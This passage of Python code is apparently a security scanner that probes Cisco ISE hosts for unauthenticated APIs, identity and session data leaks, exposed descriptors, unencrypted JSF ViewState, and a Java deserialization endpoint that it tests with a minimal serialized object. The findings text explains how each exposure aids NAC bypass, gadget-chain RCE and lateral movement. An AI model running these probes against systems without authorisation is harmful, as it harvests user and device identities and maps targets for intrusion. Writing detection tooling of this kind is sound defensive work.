                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _ers_port,
        })
        try:
            _txt = _body.decode(errors='replace')
            _weak = re.findall(
                r'"(?:allowPapAscii|allowChap|allowEapMd5|allowLeap|allowWeakCiphers'
                r'|pap|chap|eap-md5|leap)"[^,}]{0,40}true',
                _txt, re.IGNORECASE,
            )
            if _weak:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'ISE_WEAK_AUTH_PROTOCOL',
                    'detail':   (
                        f'Allowed-protocols response on {host}:{_ers_port} contains '
                        f'{len(_weak)} weak-auth indicator(s): '
                        f'{str(_weak[:5])[:300]} — PAP/CHAP/EAP-MD5 transmit '
                        f'credentials in cleartext or with broken hashing; enables '
                        f'offline credential recovery from captured RADIUS/TACACS+ traffic.'
                    ),
                    'host': host,
                    'port': _ers_port,
                })
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 8. MnT REST API — active session list
    # ------------------------------------------------------------------
    _st, _body = _get_https(443, '/admin/API/mnt/Session/ActiveList')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_ACTIVE_SESSIONS_UNAUTH',
            'detail':   (
                f'GET /admin/API/mnt/Session/ActiveList on {host}:443 '
                f'returned HTTP 200 without credentials — live RADIUS/TACACS+ '
                f'session table exposed; yields username, MAC, IP, NAS, policy, '
                f'and VLAN assignments for all active network sessions. '
                f'Preview: {_body[:400].decode(errors="replace")}'
            ),
            'host': host,
            'port': 443,
        })

    return findings


# ---------------------------------------------------------------------------
# ISE 3.1 Endpoint Profiling and Passive Identity Exposure
# ---------------------------------------------------------------------------
def probe_ise_profiling_passive_id(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Detect Cisco ISE 3.1 endpoint profiling and passive identity services exposure.

    ISE 3.1 profiling classifies endpoints via probes (DHCP, SNMP, HTTP, RADIUS,
    DNS, NetFlow, NMAP). The Passive Identity Connector (PIC) aggregates
    identity events from AD WMI/syslog/REST and publishes username-to-IP
    mappings consumed by policy. Both surfaces expose PII at scale.

    Key attack value: profiler policies reveal device classification logic
    (enabling evasion), endpoint identity groups disclose MAC-to-identity
    mappings, and the PIC API exposes live AD sessions as username/IP pairs
    without authentication when misconfigured.

    References: Cisco ISE 3.1 Install Guide ch5 (admin portal login, ERS
    base URL, Open API /api/v1/); Cisco ISE 3.1 Passive Identity (PIC)
    deployment guide; ISE ERS API reference (profilerprofile, endpointgroup);
    ISE Open API (/api/v1/deployment/deployment-info, /api/v1/license/system/).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    def _get(p: int, path: str, extra_headers: dict = None) -> tuple:
        _hdrs = {'Accept': 'application/json'}
        if extra_headers:
            _hdrs.update(extra_headers)
        try:
            _req = urllib.request.Request(
                f'https://{host}:{p}{path}',
                headers=_hdrs,
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b
        except Exception:
            return None, b''

    # ------------------------------------------------------------------
    # 1. ERS port selection: dedicated 9060 → fall back to 443
    # ------------------------------------------------------------------
    _ers_port = 9060
    try:
        _sp = socket.create_connection((host, 9060), timeout=timeout)
        _sp.close()
    except Exception:
        _ers_port = port

    # ------------------------------------------------------------------
    # 2. Profiler policies — endpoint classification rules
    # ------------------------------------------------------------------
    _st, _body = _get(_ers_port, '/ers/config/profilerprofile')
    if _st == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_PROFILER_POLICIES_UNAUTH',
            'detail':   (
                f'GET /ers/config/profilerprofile on {host}:{_ers_port} '
                f'returned HTTP 200 without credentials — endpoint profiling '
                f'policy database exposed; reveals classification rules, probe '
                f'conditions, and certainty factors used to fingerprint device types. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _ers_port,
        })
        try:
            _txt = _body.decode(errors='replace')
            _device_classes = re.findall(
                r'Cisco-IP-Phone|Workstation|Apple-iPad|Android|Printer|'
                r'Camera|Medical|VMware|Windows-Workstation|Linux-Workstation',
                _txt, re.IGNORECASE,
            )
            if _device_classes:
                _uniq = list(dict.fromkeys(_device_classes))[:10]
                findings.append({
                    'severity': 'HIGH',
                    'title':    'ISE_PROFILER_POLICY_DETAILS',
                    'detail':   (
                        f'Profiler policy body on {host}:{_ers_port} references '
                        f'device classes: {_uniq} — attacker can enumerate exact '
                        f'classification conditions (OUI, DHCP options, HTTP UA) '
                        f'and spoof device identity to bypass NAC enforcement.'
                    ),
                    'host': host,
                    'port': _ers_port,
                })
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 3. Endpoint identity groups — MAC-to-group mappings
    # ------------------------------------------------------------------
    _st, _body = _get(_ers_port, '/ers/config/endpointgroup')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_ENDPOINT_IDENTITY_GROUPS',
            'detail':   (
                f'GET /ers/config/endpointgroup on {host}:{_ers_port} '
                f'returned HTTP 200 without credentials — endpoint identity '
                f'group definitions exposed; groups map profiled device types '
                f'to authorization policies; enumeration enables targeted '
                f'group-membership spoofing. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _ers_port,
        })

    # ------------------------------------------------------------------
    # 4. Passive Identity Connector (PIC) — port 9091
    # ------------------------------------------------------------------
    _pic_port = 9091
    _pic_alive = False
    try:
        _sp = socket.create_connection((host, _pic_port), timeout=timeout)
        _sp.close()
        _pic_alive = True
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_PIC_PORT_OPEN',
            'detail':   (
                f'TCP {host}:{_pic_port} accepts connections — ISE Passive Identity '
                f'Connector port open; PIC aggregates AD WMI, syslog, and API identity '
                f'events and publishes username-to-IP mappings to pxGrid consumers.'
            ),
            'host': host,
            'port': _pic_port,
        })
    except Exception:
        pass

    if _pic_alive:
        _st, _body = _get(_pic_port, '/api/v1/info')
        if _st == 200 and _body:
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_PIC_VERSION_DISCLOSED',
                'detail':   (
                    f'GET /api/v1/info on {host}:{_pic_port} returned HTTP 200 '
                    f'without credentials — PIC service version and build info '
                    f'disclosed; enables CVE targeting against the specific PIC release. '
                    f'Preview: {_body[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': _pic_port,
            })

        _st, _body = _get(_pic_port, '/api/v1/identities')
        if _st == 200 and _body:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_PASSIVE_IDENTITIES_UNAUTH',
                'detail':   (
                    f'GET /api/v1/identities on {host}:{_pic_port} returned '
                    f'HTTP 200 without credentials — passive identity session '
                    f'table exposed without authentication. '
                    f'Preview: {_body[:300].decode(errors="replace")}'
                ),
                'host': host,
                'port': _pic_port,
            })
            try:
                _txt = _body.decode(errors='replace')
                _user_ip = re.findall(
                    r'"(?:user|username|ip|ipAddress|sourceIp)"["\s:]+([^",}{]+)',
                    _txt, re.IGNORECASE,
                )
                if len(_user_ip) >= 2:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'ISE_USER_IP_MAPPING_EXPOSED',
                        'detail':   (
                            f'Passive identity response on {host}:{_pic_port} '
                            f'contains {len(_user_ip)} username/IP field(s) — '
                            f'live AD username-to-IP binding table exposed; '
                            f'enables user tracking, targeted phishing pivot, '
                            f'and identity-sourced lateral movement. '
                            f'Sample fields: {str(_user_ip[:6])[:200]}'
                        ),
                        'host': host,
                        'port': _pic_port,
                    })
            except Exception:
                pass

    # ------------------------------------------------------------------
    # 5. Open API deployment info — cluster topology
    # ------------------------------------------------------------------
    _st, _body = _get(port, '/api/v1/deployment/deployment-info')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_DEPLOYMENT_INFO_UNAUTH',
            'detail':   (
                f'GET /api/v1/deployment/deployment-info on {host}:{port} '
                f'returned HTTP 200 without credentials — ISE cluster deployment '
                f'manifest exposed; discloses node hostnames, IPs, and assigned '
                f'personas. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })
        try:
            _txt = _body.decode(errors='replace')
            _roles = re.findall(
                r'(?:PAN|MnT|PSN|pxGrid|PPAN|SPMN|'
                r'primaryAdmin|secondaryAdmin|monitoring|policyService)',
                _txt, re.IGNORECASE,
            )
            _ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', _txt)
            if _roles or _ips:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_NODE_TOPOLOGY_DISCLOSED',
                    'detail':   (
                        f'Deployment-info body on {host}:{port} contains node '
                        f'roles {list(dict.fromkeys(_roles))[:8]} and '
                        f'{len(_ips)} IP address(es) — full ISE cluster topology '
                        f'mapped; enables targeted attacks against MnT or secondary '
                        f'PAN nodes which may have weaker hardening than the primary. '
                        f'IPs: {str(_ips[:8])[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 6. MnT API — per-MAC authentication history
    # ------------------------------------------------------------------
    _st, _body = _get(port, '/admin/API/mnt/AuthStatus/MACAddress/all')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_AUTH_HISTORY_UNAUTH',
            'detail':   (
                f'GET /admin/API/mnt/AuthStatus/MACAddress/all on {host}:{port} '
                f'returned HTTP 200 without credentials — per-endpoint '
                f'authentication history exposed without auth; yields MAC addresses, '
                f'auth timestamps, policy results, failure reasons, and NAS details. '
                f'Preview: {_body[:400].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })
        try:
            _txt = _body.decode(errors='replace')
            _macs = re.findall(r'[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}', _txt)
            if _macs:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_MAC_AUTH_HISTORY',
                    'detail':   (
                        f'MnT auth-history response from {host}:{port} contains '
                        f'{len(_macs)} MAC address(es) — complete per-device '
                        f'authentication log exposed; enables asset inventory '
                        f'reconstruction and targeted 802.1X bypass via known-good '
                        f'MAC addresses. Sample: {str(_macs[:6])[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 7. License state — eval vs permanent, feature tier
    # ------------------------------------------------------------------
    _st, _body = _get(port, '/api/v1/license/system/eval-license')
    if _st == 200 and _body:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'ISE_LICENSE_INFO_UNAUTH',
            'detail':   (
                f'GET /api/v1/license/system/eval-license on {host}:{port} '
                f'returned HTTP 200 without credentials — license state, tier '
                f'(Essentials/Advantage/Premier), and expiry disclosed; confirms '
                f'feature set (pxGrid, TACACS+, PassiveID licensed or not) without '
                f'authentication. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    return findings


# ---------------------------------------------------------------------------
# JVM / Java framework surface — functions derived from:
#   "Java Virtual Machine Specification SE 8" (Oracle Press, Addison-Wesley,
#    ISBN 978-0-13-392274-5), chapters 4 (class file format), 5 (class loader),
#    and 6 (bytecode instructions).
#
#   JVM class file magic: 0xCAFEBABE (§4.1).  Java object serialization stream
#   header: 0xACED 0x0005 (ObjectStreamConstants.STREAM_MAGIC / STREAM_VERSION).
#   JSF ViewState is stored as a serialised Java object tree, base64-encoded
#   by the container — an unencrypted ViewState decodes to recognisable Java
#   serialization magic or plain XML, confirming no server-side state encryption.
# ---------------------------------------------------------------------------

def probe_ise_java_framework_fingerprint(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Detect Cisco ISE Java web-framework version leakage and class-file exposure.

    ISE 3.x ships an Apache Tomcat/Spring MVC stack behind the admin HTTPS
    listener on port 443.  Misconfigured deployments leak internal Java details
    through HTTP response headers, JSF ViewState, error page stack traces, and
    directly accessible WEB-INF / META-INF resources — all of which a class-
    file-format-aware attacker can exploit to map the internal package hierarchy
    and version fingerprint the JVM stack for targeted gadget-chain selection.

    Constant pool class descriptors (JVM spec §4.4.1) embedded in stack traces
    or Javadoc pages reveal internal fully-qualified class names (e.g.
    com/cisco/ise/admin/...) that correspond 1:1 to .class file paths on disk,
    enabling directory traversal attempts or targeted deserialization gadget-
    chain construction.

    References: JVM Specification SE 8 §4.1 (ClassFile structure, magic
    0xCAFEBABE), §4.4 (constant_pool), §4.4.7 (CONSTANT_Utf8_info class
    descriptors); ISE 3.1 Install Guide ch5 (admin portal paths); Oracle Java
    EE 7 Servlet 3.1 spec §15 (JSESSIONID cookie requirements); JSF 2.2 spec
    §2.2.6 (ViewState encryption).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE
    _base = f'https://{host}:{port}'

    def _get(path: str, extra_headers: dict = None) -> tuple:
        """Return (status_code, body_bytes, headers_dict). Never raises."""
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/json',
        }
        if extra_headers:
            _h.update(extra_headers)
        try:
            _req = urllib.request.Request(f'{_base}{path}', headers=_h)
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192), dict(_r.headers)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(8192)
            except Exception:
                pass
            return _e.code, _b, {}
        except Exception:
            return None, b'', {}

    # ------------------------------------------------------------------
    # 1. /admin/login.jsp — admin login page accessibility
    # ------------------------------------------------------------------
    _st, _body, _hdrs = _get('/admin/login.jsp')
    if _st is not None and _st < 500:
        _txt = _body.decode(errors='replace')

        findings.append({
            'severity': 'MEDIUM',
            'title':    'ISE_ADMIN_JSP_ACCESSIBLE',
            'detail':   (
                f'GET /admin/login.jsp on {host}:{port} returned HTTP {_st} — '
                f'the ISE administration login page is reachable without prior '
                f'network-layer access control; confirms Tomcat/JSP stack is '
                f'internet-accessible and a valid pre-auth attack surface. '
                f'Preview: {_txt[:200]}'
            ),
            'host': host,
            'port': port,
        })

        # Framework hints in page body: Spring, Struts, JSF tokens
        _fw_patterns = [
            (r'springframework', 'Spring Framework'),
            (r'struts', 'Apache Struts'),
            (r'javax\.faces', 'JavaServer Faces (JSF)'),
            (r'com\.sun\.faces', 'Mojarra JSF'),
            (r'org\.apache\.myfaces', 'Apache MyFaces JSF'),
            (r'richfaces', 'RichFaces'),
            (r'primefaces', 'PrimeFaces'),
            (r'org\.apache\.struts', 'Apache Struts'),
        ]
        _found_fw = []
        for _pat, _label in _fw_patterns:
            if re.search(_pat, _txt, re.IGNORECASE):
                _found_fw.append(_label)
        if _found_fw:
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_JAVA_FRAMEWORK_DISCLOSED',
                'detail':   (
                    f'GET /admin/login.jsp on {host}:{port} body references Java '
                    f'framework tokens: {_found_fw} — framework identity narrows '
                    f'gadget-chain selection for deserialization attacks and '
                    f'surfaces known CVEs (e.g. Spring4Shell, Struts RCE series). '
                    f'Internal constant-pool class descriptors (JVM spec §4.4.1) '
                    f'may be cross-referenced to identify exact JAR versions on disk.'
                ),
                'host': host,
                'port': port,
            })

        # JSF ViewState hidden field
        _vs_match = re.search(
            r'<input[^>]+name=["\']javax\.faces\.ViewState["\'][^>]+value=["\']([^"\']+)["\']',
            _txt, re.IGNORECASE,
        )
        if _vs_match:
            _vs_val = _vs_match.group(1)
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_JSF_VIEWSTATE_EXPOSED',
                'detail':   (
                    f'GET /admin/login.jsp on {host}:{port} contains a '
                    f'javax.faces.ViewState hidden field — JSF server-side state '
                    f'is transmitted in-band; value prefix: {_vs_val[:60]!r}. '
                    f'JSF spec §2.2.6 requires server-side state saving or '
                    f'AES-encrypted client-side state; unencrypted ViewState '
                    f'enables object injection via deserialized state tree.'
                ),
                'host': host,
                'port': port,
            })
            # Check for unencrypted ViewState: Java serialization magic or plain XML
            try:
                # Base64 decode (standard or URL-safe; strip padding noise)
                _vs_clean = _vs_val.replace(' ', '+')
                _vs_padded = _vs_clean + '=' * (-len(_vs_clean) % 4)
                _vs_decoded = base64.b64decode(_vs_padded)
                # Java serialization magic: 0xAC 0xED 0x00 0x05 (JVM spec
                # ObjectStreamConstants; not in the class file spec itself but
                # produced by java.io.ObjectOutputStream which serializes
                # constant-pool-described object graphs)
                _is_serial = _vs_decoded[:2] == b'\xac\xed'
                # Plain XML state (unencrypted JSF 1.x default)
                _is_xml = _vs_decoded[:5] in (b'<?xml', b'<stat', b'<view')
                if _is_serial or _is_xml:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'ISE_UNENCRYPTED_VIEWSTATE',
                        'detail':   (
                            f'ViewState on {host}:{port} base64-decodes to '
                            f'{"Java serialization stream (0xACED magic)" if _is_serial else "plain XML"} '
                            f'— server-side state is not encrypted; attacker can '
                            f'craft a malicious serialized object graph using a '
                            f'compatible gadget chain (e.g. Commons Collections, '
                            f'Spring AOP) and submit it as ViewState to achieve '
                            f'RCE on the ISE Tomcat JVM. '
                            f'JVM class file magic 0xCAFEBABE (§4.1) identifies '
                            f'the target runtime; serialization magic 0xACED (§ '
                            f'ObjectStreamConstants) confirms java.io.Serializable '
                            f'deserialization path active.'
                        ),
                        'host': host,
                        'port': port,
                    })
            except Exception:
                pass

        # X-Powered-By header
        _xpb = _hdrs.get('X-Powered-By', _hdrs.get('x-powered-by', ''))
        if _xpb:
            _sev = 'HIGH' if re.search(r'spring|jsf|faces|struts', _xpb, re.IGNORECASE) else 'MEDIUM'
            _title = ('ISE_SPRING_FRAMEWORK_DISCLOSED'
                      if re.search(r'spring', _xpb, re.IGNORECASE)
                      else 'ISE_JAVA_SERVLET_VERSION')
            findings.append({
                'severity': _sev,
                'title':    _title,
                'detail':   (
                    f'X-Powered-By: {_xpb!r} on {host}:{port} — framework and '
                    f'version leaked in HTTP response header; enables precise '
                    f'CVE targeting without touching the application payload. '
                    f'Disable or sanitize X-Powered-By in Tomcat server.xml.'
                ),
                'host': host,
                'port': port,
            })

        # Server header
        _srv = _hdrs.get('Server', _hdrs.get('server', ''))
        if _srv and re.search(r'tomcat|jboss|jetty|glassfish|java|weblogic', _srv, re.IGNORECASE):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_JAVA_SERVER_HEADER',
                'detail':   (
                    f'Server: {_srv!r} on {host}:{port} — Java application server '
                    f'identity and version disclosed; use server token="Prod" in '
                    f'Tomcat server.xml to suppress. '
                    f'Major version maps to supported JVM class file major_version '
                    f'(JVM spec §4.1): Tomcat 9=Java11(55), Tomcat 10=Java17(61).'
                ),
                'host': host,
                'port': port,
            })

        # JSESSIONID cookie
        _cookie = _hdrs.get('Set-Cookie', _hdrs.get('set-cookie', ''))
        if 'JSESSIONID' in _cookie:
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_JSESSIONID_EXPOSED',
                'detail':   (
                    f'Set-Cookie on {host}:{port} contains JSESSIONID — '
                    f'Java Servlet session token visible in response; '
                    f'cookie attributes: {_cookie[:200]!r}.'
                ),
                'host': host,
                'port': port,
            })
            _missing_flags = []
            if 'HttpOnly' not in _cookie:
                _missing_flags.append('HttpOnly')
            if 'Secure' not in _cookie:
                _missing_flags.append('Secure')
            if _missing_flags:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'ISE_INSECURE_SESSION_COOKIE',
                    'detail':   (
                        f'JSESSIONID cookie on {host}:{port} missing flags: '
                        f'{_missing_flags} — session token susceptible to '
                        f'interception (missing Secure) or XSS theft (missing '
                        f'HttpOnly). Java EE Servlet 3.1 spec §7.1.1 requires '
                        f'both flags on production deployments.'
                    ),
                    'host': host,
                    'port': port,
                })

    # ------------------------------------------------------------------
    # 2. /admin/error.jsp — Java stack trace disclosure
    # ------------------------------------------------------------------
    _st2, _body2, _hdrs2 = _get('/admin/error.jsp')
    if _st2 is not None and _st2 < 500:
        _txt2 = _body2.decode(errors='replace')
        # Stack trace markers: "at com.", "java.lang.", "Exception"
        if re.search(r'\bat\s+[\w\$\.]+\([\w]+\.java:\d+\)', _txt2):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_JAVA_STACK_TRACE_UNAUTH',
                'detail':   (
                    f'GET /admin/error.jsp on {host}:{port} returned HTTP {_st2} '
                    f'with a Java stack trace — unauthenticated callers see internal '
                    f'class names, method signatures, and source line numbers. '
                    f'Stack traces expose the fully-qualified class names that '
                    f'correspond to constant-pool CONSTANT_Class_info entries '
                    f'(JVM spec §4.4.1), enabling gadget-chain construction. '
                    f'Preview: {_txt2[:300]}'
                ),
                'host': host,
                'port': port,
            })
            # Extract class paths / package names from the trace
            _class_refs = re.findall(
                r'at\s+((?:com\.cisco|org\.springframework|javax\.|'
                r'org\.apache|sun\.|java\.)[\w\$\.]+)\(',
                _txt2,
            )
            if _class_refs:
                _uniq_classes = list(dict.fromkeys(_class_refs))[:10]
                findings.append({
                    'severity': 'HIGH',
                    'title':    'ISE_JAVA_CLASS_PATHS_LEAKED',
                    'detail':   (
                        f'Stack trace on {host}:{port} exposes internal class '
                        f'paths: {_uniq_classes} — each entry is a valid JVM '
                        f'internal name (slash-separated form per JVM spec §4.2.1) '
                        f'that can be converted to a .class file path for '
                        f'targeted traversal or gadget-chain assembly.'
                    ),
                    'host': host,
                    'port': port,
                })

    # ------------------------------------------------------------------
    # 3. /admin/imgs/ — static directory listing
    # ------------------------------------------------------------------
    _st3, _body3, _ = _get('/admin/imgs/')
    if _st3 is not None and _st3 < 400:
        _txt3 = _body3.decode(errors='replace')
        if re.search(r'Index of|<a href=.*\.(gif|png|jpg|css|js)"', _txt3, re.IGNORECASE):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_STATIC_DIR_ACCESSIBLE',
                'detail':   (
                    f'GET /admin/imgs/ on {host}:{port} returned HTTP {_st3} '
                    f'with a directory listing or image index — static resource '
                    f'directory is browsable; reveals asset paths that may '
                    f'disclose version strings or internal file layout. '
                    f'Preview: {_txt3[:200]}'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # 4. /admin/WEB-INF/web.xml — servlet descriptor (path traversal)
    # ------------------------------------------------------------------
    _st4, _body4, _ = _get('/admin/WEB-INF/web.xml')
    if _st4 == 200 and _body4:
        _txt4 = _body4.decode(errors='replace')
        if re.search(r'<web-app|<servlet|<filter|<listener', _txt4, re.IGNORECASE):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_WEB_XML_EXPOSED',
                'detail':   (
                    f'GET /admin/WEB-INF/web.xml on {host}:{port} returned '
                    f'HTTP 200 with a valid servlet descriptor — WEB-INF should '
                    f'be protected by the Servlet container (JSR-340 §10.5); '
                    f'exposure reveals servlet class mappings, filter chains, '
                    f'security-constraint declarations, and init-params that '
                    f'may include credential or keystore references. '
                    f'Servlet class names cross-reference JVM constant-pool '
                    f'CONSTANT_Class_info entries (§4.4.1) enabling targeted '
                    f'deserialization gadget enumeration. '
                    f'Preview: {_txt4[:400]}'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # 5. /admin/META-INF/MANIFEST.MF — JAR manifest
    # ------------------------------------------------------------------
    _st5, _body5, _ = _get('/admin/META-INF/MANIFEST.MF')
    if _st5 == 200 and _body5:
        _txt5 = _body5.decode(errors='replace')
        if re.search(r'Manifest-Version|Main-Class|Class-Path|Implementation-Version', _txt5):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_MANIFEST_MF_EXPOSED',
                'detail':   (
                    f'GET /admin/META-INF/MANIFEST.MF on {host}:{port} returned '
                    f'HTTP 200 with a valid JAR manifest — META-INF is protected '
                    f'by Servlet spec §10.5 but Tomcat misconfigurations expose '
                    f'it; manifest reveals Main-Class, Class-Path (exact JAR '
                    f'names and versions), and Implementation-Version attributes '
                    f'that uniquely identify the ISE WAR build for CVE lookup. '
                    f'Class-Path entries map to .class files whose constant pools '
                    f'(JVM spec §4.4) name every dependency available to the JVM '
                    f'class loader — the full gadget-chain ingredient list. '
                    f'Preview: {_txt5[:400]}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_ise_java_serialization_endpoints(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Detect Java deserialization and object-serialization attack surface in Cisco ISE.

    Java object serialization streams begin with the magic bytes 0xACED followed
    by the stream version 0x0005 (java.io.ObjectStreamConstants.STREAM_MAGIC and
    STREAM_VERSION).  When a Java endpoint deserializes untrusted data without a
    class-filter allowlist (JEP 290 / JVM spec §5.3 class-loading constraints),
    an attacker can substitute a gadget chain whose constant-pool class names
    (JVM spec §4.4.1 CONSTANT_Class_info) resolve to classes already on the
    server classpath (Commons Collections, Spring AOP, etc.) and trigger RCE
    during the readObject() call tree.

    This probe identifies ISE API surfaces that accept or produce serialized Java
    objects, and checks for Log4Shell (CVE-2021-44228) via response differential
    on a JNDI probe string (no external JNDI server contacted).

    References: JVM Specification SE 8 §4.1 (class file magic 0xCAFEBABE),
    §4.4.1 (CONSTANT_Class_info internal name form), §5.3 (class loader
    resolution); java.io.ObjectStreamConstants (STREAM_MAGIC=0xACED,
    STREAM_VERSION=0x0005); CVE-2021-44228 (Log4Shell); Cisco ISE 3.1 pxGrid
    2.0 API reference; ISE ERS SDK docs.

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    # Java serialization stream header: STREAM_MAGIC(0xACED) + STREAM_VERSION(0x0005)
    # Followed by TC_OBJECT(0x73) + TC_CLASSDESC(0x72) to form a minimal but
    # structurally valid serialization stream opening (JVM spec §4.4 class refs).
    _SERIAL_MAGIC = b'\xac\xed\x00\x05'
    # Minimal serialized NullObject payload: magic + version + TC_NULL(0x70)
    _SERIAL_NULL  = b'\xac\xed\x00\x05\x70'

    def _https_post(path: str, body: bytes, content_type: str,
                    req_port: int = None, extra_headers: dict = None) -> tuple:
        """POST to HTTPS, return (status, body_bytes). Never raises."""
        _p = req_port if req_port is not None else port
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Content-Type': content_type,
        }
        if extra_headers:
            _h.update(extra_headers)
        try:
            _req = urllib.request.Request(
                f'https://{host}:{_p}{path}',
                data=body,
                headers=_h,
                method='POST',
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(4096)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b
        except Exception:
            return None, b''

    def _https_get(path: str, req_port: int = None, extra_headers: dict = None) -> tuple:
        """GET from HTTPS, return (status, body_bytes). Never raises."""
        _p = req_port if req_port is not None else port
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': 'text/html,application/xhtml+xml,application/json,text/xml',
        }
        if extra_headers:
            _h.update(extra_headers)
        try:
            _req = urllib.request.Request(
                f'https://{host}:{_p}{path}',
                headers=_h,
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b
        except Exception:
            return None, b''

    # ------------------------------------------------------------------
    # 1. POST /admin/gateway/api — serialized object acceptance probe
    #    Differential: 500 = deserialization attempted; 400 = content-type
    #    rejected before parsing; 415 = unsupported media type (safe reject).
    # ------------------------------------------------------------------
    _st_norm, _body_norm = _https_post(
        '/admin/gateway/api',
        b'{}',
        'application/json',
    )
    _st_serial, _body_serial = _https_post(
        '/admin/gateway/api',
        _SERIAL_NULL,
        'application/x-java-serialized-object',
    )
    if _st_serial is not None and _st_serial == 500:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_JAVA_DESERIALIZ_GATEWAY',
            'detail':   (
                f'POST /admin/gateway/api on {host}:{port} with '
                f'Content-Type: application/x-java-serialized-object and '
                f'Java serialization magic (0xACED 0x0005) returned HTTP 500 — '
                f'endpoint attempted to deserialize the payload before rejecting '
                f'it (HTTP 400/415 would indicate a safe pre-parse content-type '
                f'check). Confirms active java.io.ObjectInputStream.readObject() '
                f'deserialization path; gadget chain targeting Commons Collections '
                f'or Spring AOP (classes named in JVM constant pools §4.4.1) '
                f'may achieve RCE. Normal JSON response: HTTP {_st_norm}. '
                f'Serial response preview: {_body_serial[:200].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 2. GET /ers/sdk — ERS SDK / WSDL exposure
    # ------------------------------------------------------------------
    _st_sdk, _body_sdk = _https_get('/ers/sdk')
    if _st_sdk is not None and _st_sdk < 400 and _body_sdk:
        _txt_sdk = _body_sdk.decode(errors='replace')
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_ERS_SDK_EXPOSED',
            'detail':   (
                f'GET /ers/sdk on {host}:{port} returned HTTP {_st_sdk} — '
                f'ERS SDK page accessible without authentication; may expose '
                f'API documentation, WADL/WSDL descriptors, or Swagger UI '
                f'that enumerates all REST endpoints and their schemas. '
                f'Preview: {_txt_sdk[:300]}'
            ),
            'host': host,
            'port': port,
        })
        # SOAP/WSDL endpoint hints
        if re.search(r'wsdl|\.wsdl|<definitions|soap:|wsdl:', _txt_sdk, re.IGNORECASE):
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_WSDL_ENDPOINTS',
                'detail':   (
